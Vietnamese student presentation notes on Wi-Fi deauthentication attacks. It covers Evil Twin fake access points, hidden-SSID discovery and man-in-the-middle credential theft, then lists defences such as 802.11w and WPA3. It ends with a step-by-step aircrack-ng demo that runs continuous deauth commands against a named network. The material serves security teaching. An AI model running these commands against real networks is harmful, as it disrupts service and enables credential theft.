# 4️⃣ Ứng dụng thực tế & Kết luận (Người 4)
## **Deauth Attack kết hợp với Evil Twin Attack (Fake AP)**  

Deauth Attack có thể đóng vai trò quan trọng trong việc thực hiện **Evil Twin Attack**, giúp kẻ tấn công đánh lừa nạn nhân kết nối vào một điểm truy cập giả mạo (**Fake AP**) thay vì AP thật.  

---

### **📌 Cách thức tấn công**  
#### 🔴 **Bước 1: Thực hiện Deauth Attack để ngắt kết nối nạn nhân khỏi AP thật**  
- 
sử dụng **Deauth Attack** để gửi các gói **Deauthentication** đến client mục tiêu, buộc nó phải ngắt kết nối khỏi Wi-Fi thật.  
- Công cụ phổ biến:  
  - `aircrack-ng` → `aireplay-ng -0 5 -a <MAC_AP> -c <MAC_CLIENT> wlan0mon`  
  - `mdk3 wlan0mon d` (Gửi liên tục gói deauth)  

---

#### 🔴 **Bước 2: Tạo Evil Twin - Fake AP**  
- Kẻ tấn công tạo một điểm truy cập giả **(Fake AP)** có cùng tên SSID với AP thật.  
- Nạn nhân, sau khi bị ngắt kết nối, sẽ vô tình kết nối vào Fake AP.  
- Công cụ phổ biến:  
  - `hostapd` (Dùng để tạo Fake AP)  
  - `airbase-ng` → `airbase-ng -e <SSID> -c <Channel> wlan0mon`  

---

#### 🔴 **Bước 3: Thu thập dữ liệu nạn nhân**  
Sau khi nạn nhân kết nối vào Fake AP, kẻ tấn công có thể:  
1. **Chặn dữ liệu (Packet Sniffing)** bằng `Wireshark` hoặc `tcpdump`.  
2. **Tấn công SSL Strip** để ép nạn nhân sử dụng HTTP thay vì HTTPS (`Bettercap`).  
3. **Gài trang đăng nhập giả** để đánh cắp mật khẩu (`dnsspoof`, `ettercap`).  

---

### **🚀 Công cụ thực hiện**
| Công cụ | Mục đích |
|---------|---------|
| `aircrack-ng` | Deauth Attack |
| `hostapd` | Tạo Fake AP |
| `ettercap` | Thu thập dữ liệu |
| `Bettercap` | Man-in-the-Middle |
| `Wireshark` | Phân tích gói tin |

## **4.2 Một số kỹ thuật nâng cao như SSID Cloaking, MiTM với Deauth Attack**

### **4.2.1. SSID Cloaking kết hợp với Deauth Attack**  

#### 🔍 **SSID Cloaking là gì?**  
SSID Cloaking (ẩn SSID) là một kỹ thuật bảo mật giúp router Wi-Fi không phát sóng tên mạng (SSID). Khi SSID bị ẩn, chỉ những thiết bị đã biết tên mạng mới có thể kết nối.  

#### ⚔ **Kết hợp SSID Cloaking với Deauth Attack**  
Kẻ tấn công có thể sử dụng Deauth Attack để ép các thiết bị mục tiêu ngắt kết nối, sau đó khai thác các gói tin để xác định SSID bị ẩn.

#### **📌 Cách thực hiện**:
1. **Gửi Deauth Attack** đến thiết bị mục tiêu → Thiết bị sẽ buộc phải kết nối lại với Wi-Fi.  
2. **Bắt gói tin Probe Request và Probe Response**: Khi thiết bị tìm kiếm lại Wi-Fi, nó sẽ gửi gói Probe Request chứa SSID đã lưu trước đó.  
3. **Xác định SSID bị ẩn**: Bằng cách phân tích các gói tin này bằng công cụ như `Wireshark` hoặc `aircrack-ng`, hacker có thể lấy được tên SSID đã bị ẩn.  
4. **Kết hợp Evil Twin Attack**: Sau khi có SSID, hacker có thể tạo một AP giả mạo để đánh lừa người dùng kết nối vào.  

🔹 **Chống lại SSID Cloaking Attack**:  
- Kích hoạt **802.11w Management Frame Protection (MFP)** để ngăn chặn Deauth Attack.  
- Sử dụng **VPN** để mã hóa lưu lượng ngay cả khi kết nối với Wi-Fi công cộng.  
- Không kết nối với mạng ẩn nếu không thực sự cần thiết.  

---

### **4.2.2. Man-in-the-Middle (MiTM) với Deauth Attack**  

#### 🕵️ **Man-in-the-Middle (MiTM) là gì?**  
MiTM là một cuộc tấn công trong đó kẻ tấn công chèn mình vào giữa kết nối giữa hai bên để nghe lén, thay đổi hoặc chặn dữ liệu.

#### ⚔ **Cách kết hợp Deauth Attack với MiTM**  

##### **📌 Kịch bản thực tế**:  
1. **Gây gián đoạn kết nối bằng Deauth Attack**  
   - Gửi gói Deauthentication đến một thiết bị trên mạng mục tiêu để ngắt kết nối nó khỏi Access Point thật.  

2. **Tạo điểm truy cập giả (Evil Twin Attack)**  
   - Thiết lập một AP giả có cùng SSID với AP thật nhưng không có mật khẩu (hoặc sử dụng WPA2 giả mạo).  
   - Khi người dùng bị ngắt kết nối, họ có thể vô tình kết nối vào AP giả.  

3. **Thực hiện MiTM Attack**  
   - Sau khi nạn nhân kết nối vào AP giả, hacker có thể:
     - **Chặn dữ liệu**: Dùng `Wireshark` hoặc `tcpdump` để theo dõi lưu lượng.  
     - **Khai thác thông tin đăng nhập**: Dùng `ettercap` hoặc `Bettercap` để thu thập thông tin từ các phiên HTTP không mã hóa.  
     - **Chạy Attack SSL Strip**: Nếu người dùng truy cập một trang web HTTP, hacker có thể chuyển hướng họ đến một trang giả mạo để đánh cắp mật khẩu.  

#### **🔥 Công cụ sử dụng**:
- `aircrack-ng` (Deauth Attack)  
- `hostapd` (Tạo AP giả)  
- `ettercap` hoặc `Bettercap` (Thực hiện MiTM)  

---

## **4.3 Ứng dụng hợp pháp**  

### **Kiểm thử bảo mật mạng Wi-Fi (Penetration Testing)**
- **Mục đích**: Giúp kiểm tra độ an toàn của mạng không dây bằng cách mô phỏng một cuộc tấn công thực tế.  
- **Cách thức**: Các chuyên gia bảo mật có thể sử dụng Deauth attack để xác định xem hệ thống có dễ bị tấn công hay không, từ đó đưa ra biện pháp khắc phục như kích hoạt WPA3, bảo vệ MAC Filtering hoặc IDS/IPS.  


### **Kiểm tra khả năng phục hồi và bảo vệ Wi-Fi (Resilience Testing)**  
- **Mục đích**: Đánh giá mức độ bảo vệ của hệ thống Wi-Fi trước các cuộc tấn công từ bên ngoài.  
- **Cách thức**:  
  - Mô phỏng một cuộc **Deauth Attack** trên hệ thống Wi-Fi của tổ chức để kiểm tra xem **các biện pháp bảo mật có hiệu quả hay không**.  
  - Nếu hệ thống có **802.11w (MFP)** hoặc các cơ chế bảo mật khác, cuộc tấn công sẽ thất bại, chứng minh mạng an toàn.  
- **Ứng dụng thực tế**:  
  - **Ngân hàng, tổ chức tài chính**: Kiểm tra khả năng chịu đựng của mạng Wi-Fi trước các cuộc tấn công.  
  - **Công ty công nghệ**: Đánh giá bảo mật hệ thống Wi-Fi trước khi triển khai rộng rãi.  

### **Tối ưu hóa hệ thống Wi-Fi**
- **Mục đích**: Trong một số trường hợp, Deauth attack có thể giúp quản trị viên mạng kiểm tra hiệu suất roaming (chuyển vùng) giữa các Access Point.  
- **Cách thức**: Bằng cách gửi gói deauth, người ta có thể theo dõi xem thiết bị có nhanh chóng chuyển sang một AP mạnh hơn hay không.  

### **Hỗ trợ bảo mật vật lý & kiểm soát thiết bị trái phép**

- **Mục đích**: Ngăn chặn hoặc phát hiện các thiết bị trái phép kết nối vào mạng Wi-Fi trong khu vực bảo mật cao như doanh nghiệp, tổ chức chính phủ, phòng nghiên cứu.

**Cách thức:**  
- Hệ thống bảo mật Wi-Fi có thể sử dụng Deauth Attack để buộc ngắt kết nối các thiết bị không được phép dựa trên danh sách MAC Address hợp lệ.  
- Nếu phát hiện một thiết bị lạ đang kết nối vào mạng nội bộ, hệ thống sẽ tự động gửi gói Deauthentication để chặn kết nối.  

**Ứng dụng thực tế:**  
- **Công ty**: Chặn các thiết bị cá nhân không được phép truy cập vào mạng doanh nghiệp.  

**Phòng tránh:**  
Sử dụng các hệ thống bảo mật Wi-Fi chuyên nghiệp có chức năng **Intrusion Prevention System (IPS)** thay vì dùng Deauth Attack thủ công.

---

## **Wi-Fi không an toàn như chúng ta nghĩ – Những rủi ro & Cách phòng tránh**  

Wi-Fi là công nghệ phổ biến trong đời sống hiện đại, nhưng thực tế nó **không an toàn như chúng ta tưởng**. Những cuộc tấn công như **Deauth Attack, Evil Twin, Man-in-the-Middle (MiTM), WPA Handshake Capture**, v.v., có thể dễ dàng đánh cắp dữ liệu của người dùng nếu không có biện pháp bảo vệ phù hợp.  

---

### **📌 Vì sao Wi-Fi không an toàn?**  

🔴 **Dễ bị tấn công Deauthentication** → Kẻ tấn công có thể buộc thiết bị rời khỏi mạng một cách dễ dàng bằng Deauth Attack.  
🔴 **Dễ bị giả mạo AP (Evil Twin Attack)** → Một Fake AP có thể lừa người dùng kết nối và đánh cắp dữ liệu.  
🔴 **Dữ liệu có thể bị chặn (Sniffing & MiTM Attack)** → Hacker có thể đọc, chỉnh sửa dữ liệu nếu người dùng truy cập HTTP thay vì HTTPS.  
🔴 **Mật khẩu có thể bị bẻ khóa** → Nếu Wi-Fi dùng **WPA2-PSK**, hacker có thể thu thập WPA Handshake và thực hiện **Brute Force Attack** để lấy mật khẩu.  

---

### **🛡 Cách phòng tránh tấn công Wi-Fi**  

✅ **Sử dụng WPA3 thay vì WPA2** → WPA3 có bảo vệ chống lại các cuộc tấn công Deauth & Brute Force.  
✅ **Kích hoạt 802.11w (Management Frame Protection - MFP)** → Ngăn chặn Deauth Attack.  
✅ **Không kết nối vào Wi-Fi công cộng** nếu không có VPN.  
✅ **Luôn kiểm tra mạng trước khi nhập thông tin đăng nhập** (tránh Evil Twin Attack).  
✅ **Chỉ truy cập các trang web HTTPS** để tránh bị MiTM Attack.  
✅ **Dùng VPN để mã hóa dữ liệu**, ngay cả khi đang ở mạng tin cậy.  
✅ **Đặt mật khẩu Wi-Fi mạnh** (dài, phức tạp, không dễ đoán).  

---

### **🔎 Kết luận**  
> ❗ **Wi-Fi không an toàn tuyệt đối**. Dù sử dụng mạng gia đình hay Wi-Fi công cộng, luôn có nguy cơ bị tấn công.  
> ✅ **Biện pháp bảo vệ quan trọng nhất là sử dụng VPN, HTTPS, WPA3 và tránh Wi-Fi công cộng không mã hóa.**  

# 5️⃣ Demo thực tế: Tấn công Deauthentication (Người 5)
Chuẩn bị môi trường (WiFi Adapter, Kali Linux, airodump-ng, aireplay-ng).
Cách tìm AP và client bằng airodump-ng.
Gửi gói deauth bằng aireplay-ng.
Kiểm tra kết quả: Client bị mất kết nối với WiFi.
Hỏi đáp với khán giả.

## Setup

Cài đặt aircrack-ng:

![image](https://hackmd.io/_uploads/B1Iftu3oJe.png)

Kiểm tra các adapter đang có: 

![image](https://hackmd.io/_uploads/SJkAOOhjye.png)

- `wlp0s20f3` (phy1): 2.4GHz/5GHz
- `wlx784476bf1924` (phy2): 2.4GHz

Kiểm tra các mode khả dụng: 

![image](https://hackmd.io/_uploads/Hk9_5_nsyx.png)

![image](https://hackmd.io/_uploads/HkFF5_2jJg.png)

--> Cả 2 adapter đều có thể đưa về mode monitor để tiến hành inject packet

## Attack

Thông thường, ta sẽ tắt các tiến trình liên quan với adapter:

```
airmon-ng check kill
```

![airmon-check-kill](https://hackmd.io/_uploads/r1GbjF3j1e.png)

Nhưng với băng tần 5GHz, khi tắt adapter thì nó sẽ tự xoá Regulatory Domain:

```
iw reg get
```

![regulatory-domain-deleted](https://hackmd.io/_uploads/SkE7FYhiyl.png)

Vì thế ta sẽ không dùng lệnh đó để đảm bảo NetworkManager vẫn hoạt động:

![network-manager-still-working](https://hackmd.io/_uploads/rJJrttnjkx.png)

Khi check lại Regulatory Domain thì vẫn giữ nguyên Country US:

![regulatory-domain-existed](https://hackmd.io/_uploads/Bk5BtYniyx.png)

> Giải thích về regulatory-domain

Lúc này ta tiến hành đưa các adapter về mode monitor:

```
airmon-ng start wlp0s20f3
airmon-ng start wlx784476bf1924
```

![airmon-start-phy1](https://hackmd.io/_uploads/r1Fp9F3oye.png)

![airmon-start-phy2](https://hackmd.io/_uploads/BydR9Ynokg.png)

Kiểm tra lại các adapter bằng lệnh `iwconfig`:

![iwconfig-check-after-switch-mode](https://hackmd.io/_uploads/rJz5tF2iyg.png)

> Lệnh airmon-ng sẽ thêm đuôi mon vào cuối tên adapter

Trước tiên, ta tiến hành deauth mạng 2.4GHz với adapter `wlx784476bf1924` (phy2). Đầu tiên ta lắng nghe toàn bộ mạng gần đây:

```
airodump-ng wlx784476bf1924
```

![airodump-list-2.4ghz](https://hackmd.io/_uploads/r16x9tnjkx.png)

Thấy wifi tên `Tri` với BSSID là `30:60:0A:D9:7F:31` và ở channel 6, do đó ta lắng nghe lại với các thông tin như trên để thiết lập adapter với tần số (frequency) tương ứng channel 6:

```
airodump-ng --bssid 30:60:0A:D9:7F:31 -c 6 wlx784476bf1924
```

![airodump-list-2.4-Tri](https://hackmd.io/_uploads/rJz-9Fnokl.png)

Mở terminal khác lên và lúc này ta tiến hành deauth wifi đó bằng công cụ aireplay-ng
    
```
aireplay-ng -0 0 -a 30:60:0A:D9:7F:31 wlx784476bf1924
```

![aireplay-deauth-2.4](https://hackmd.io/_uploads/HkQK9FhsJx.png)

Tương tự với băng tầng 5GHz nhưng lần này với tham số `--band a`

```
airodump-ng --band a wlp0s20f3mon
```

![airodump-list-5ghz](https://hackmd.io/_uploads/rkpIiKnjJx.png)

Với ESSID là `Tri` và địa chỉ MAC khác `30:60:0A:D9:7F:39` cũng như channel khác 36, ta tiến hành listen với các tham số đó để thiết lập channel cho adapter:

```
airodump-ng --bssid 30:60:0A:D9:7F:39 -c 36 wlp0s20f3mon
```

![airodump-list-5-Tri](https://hackmd.io/_uploads/SkOsiY3okl.png)

Cuối cùng ta tiến hành deauth wifi Tri ở băng tần 5GHz:

```
aireplay-ng -0 0 -a 30:60:0A:D9:7F:39 wlp0s20f3mon
```

![image](https://hackmd.io/_uploads/BkUM3FnsJe.png)

Vì đây là adapter deauth băng tầng 5GHZ nên phải đảm bảo Regulatory Domain vẫn cho phép inject deauth packet ở channel 36:

```
iw phy phy1 info | grep -A 20 Frequencies
```

![image](https://hackmd.io/_uploads/S1GWaK2iJe.png)

Channel 36 có frequency là 5180, do đó ta sẽ xem coi Regulatory Domain có cho phép hay không:

```
iw reg get
```

![image](https://hackmd.io/_uploads/HyYHTYhske.png)

Ta không thấy chữ PASSIVE-SCAN ở frequency 5180MHz do đó việc deauth vẫn được thực hiện bình thường
